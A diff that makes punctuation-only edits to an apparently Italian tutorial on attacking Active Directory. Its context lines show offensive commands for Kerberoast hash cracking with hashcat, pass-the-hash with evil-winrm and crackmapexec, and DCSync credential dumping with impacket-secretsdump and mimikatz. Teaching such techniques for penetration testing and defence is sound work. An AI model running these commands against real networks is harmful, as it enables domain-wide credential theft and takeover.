@@ -13,7 +13,7 @@ Active Directory (AD) è presente nel 90% delle reti enterprise Windows. Chi rie
 
 AD è un servizio di directory distribuito basato su LDAP e Kerberos. Gestisce autenticazione e autorizzazione per tutti gli oggetti della rete: utenti, computer, gruppi, GPO. Il componente centrale è il **Domain Controller (DC)**, che ospita il database NTDS.dit contenente tutti gli hash delle password del dominio.
 
-## Enumerazione AD — prima di tutto
+## Enumerazione AD: prima di tutto
 
 Prima di attaccare, si enumera. Con accesso a un account di dominio (anche non privilegiato):
 
@@ -51,7 +51,7 @@ hashcat -m 13100 spn_hashes.txt rockyou.txt --rules-file /usr/share/hashcat/rule
 
 ## AS-REP Roasting
 
-Se un account ha **"Do not require Kerberos preauthentication"** abilitato, è possibile richiedere un AS-REP senza fornire credenziali. Il KDC risponde con dati cifrati con l'hash dell'utente — crackabili offline.
+Se un account ha **"Do not require Kerberos preauthentication"** abilitato, è possibile richiedere un AS-REP senza fornire credenziali. Il KDC risponde con dati cifrati con l'hash dell'utente, crackabili offline.
 
 ```bash
 # Trova account vulnerabili e ottieni AS-REP
@@ -71,7 +71,7 @@ evil-winrm -i 10.10.10.1 -u Administrator -H ntlm_hash
 crackmapexec smb 10.10.10.0/24 -u Administrator -H ntlm_hash
 ```
 
-## DCSync — replicare il Domain Controller
+## DCSync: replicare il Domain Controller
 
 Con privilegi sufficienti (DA, Enterprise Admin, o DCSync rights), è possibile simulare la replica AD e ottenere tutti gli hash:
 
@@ -81,7 +81,7 @@ impacket-secretsdump domain.local/Administrator@10.10.10.1
 # lsadump::dcsync /domain:domain.local /all /csv
 ```
 
-Il risultato è l'intero database NTDS.dit — game over per il dominio.
+Il risultato è l'intero database NTDS.dit, game over per il dominio.
 
 ## Contromisure chiave
 
